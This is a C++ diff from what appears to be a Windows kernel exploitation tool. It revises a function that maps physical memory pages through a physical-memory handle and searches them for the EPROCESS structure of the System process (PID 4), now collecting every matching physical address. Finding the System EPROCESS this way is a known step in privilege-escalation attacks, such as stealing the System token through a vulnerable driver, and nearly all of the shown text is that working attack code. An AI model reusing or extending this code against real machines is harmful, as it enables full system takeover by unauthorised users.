@@ -176,7 +176,7 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 	return 0;
 }
 
-unsigned __int64 GetEPROCESSPhysicalBase(const char* processName ,int pid ,HANDLE hPhysicalMemory) {
+unsigned __int64 GetEPROCESSPhysicalBase(const char* processName ,int pid ,HANDLE hPhysicalMemory, std::vector <unsigned __int64>& locations) {
 
 	int memRegionsCount = -1;
 	//UCHAR ImageFileName[15];
@@ -250,55 +250,40 @@ unsigned __int64 GetEPROCESSPhysicalBase(const char* processName ,int pid ,HANDL
 					unsigned __int64 patternLocation = page + offset;
 					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - _EPROCESS_ImageFileName_offset;
 					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
-					// check buf bounds
-					if ((unsigned __int64)buf <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)buf)
-					{
-						if (*((unsigned __int64*)UniqueProcessId) == pid)
-						{
-							void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
-							printf("[%d] Found EPROCESS base of System at: %p\n", patternCount, physicalEPROCESSBase);
-							patternCount++;
-							//return (unsigned __int64)physicalEPROCESSBase;
-						}
+
+					// Try mapping 4 pages so the struct can fit into the mapped region
+					if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
+						fprintf(stderr, "[!] MapPhysicalMemory failed\n");
+						return -1;
 					}
-					else
+					patternLocation = page + offset;
+
+					PVOID castedFourPages = *fourPages;
+					// get middle of fourPages
+					castedFourPages = (unsigned char*)castedFourPages + 0x2000;
+
+					// now castedFourPages and *buf point to the same memory
+					// add pattern offset
+					castedFourPages = (unsigned char*)castedFourPages + offset;
+
+					EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - _EPROCESS_ImageFileName_offset;
+
+					UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
+
+					// TODO: Check physical address ranges
+					if (*((unsigned __int64*)UniqueProcessId) == pid)
 					{
-						//fprintf(stderr, "Struct does not fit into one page. Try mapping 4 pages.\n");
-						if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
-							fprintf(stderr, "[!] MapPhysicalMemory failed\n");
-							return -1;
-						}
-						patternLocation = page + offset;
+						// PID of System is 4
+						void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
+						printf("[%d] Found EPROCESS Base of System at: %p\n", patternCount, physicalEPROCESSBase);
+						patternCount++;
+						locations.push_back((unsigned __int64)physicalEPROCESSBase);
+					}
 
-						// get middle of fourPages
-						PVOID castedFourPages = *fourPages;
-						castedFourPages = (unsigned char*)castedFourPages + 0x2000;
-
-						// now castedFourPages and *buf point to the same memory
-						//printf("\nFound pattern at: %p\n", (void*)(page + offset));
-
-						// add pattern offset
-						castedFourPages = (unsigned char*)castedFourPages + offset;
-
-						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - _EPROCESS_ImageFileName_offset;
-
-						UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
-
-						// TODO: Check physical address ranges 
-						if (*((unsigned __int64*)UniqueProcessId) == pid)
-						{
-							// PID of System is 4
-							void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
-							printf("[%d] Found EPROCESS Base of System at: %p\n", patternCount, physicalEPROCESSBase);
-							patternCount++;
-							//return (unsigned __int64)physicalEPROCESSBase;
-						}
-
-						//memset(fourPages, 0, 0x4000); unnecessary
-						if (UnmapPhysicalMemory(fourPages) == FALSE) {
-							printf("UnmapPhysicalMemory failed\n");
-							return -1;
-						}
+					//memset(fourPages, 0, 0x4000); unnecessary
+					if (UnmapPhysicalMemory(fourPages) == FALSE) {
+						printf("UnmapPhysicalMemory failed\n");
+						return -1;
 					}
 				}
 				castedBuf = (unsigned char*)castedBuf + 1;
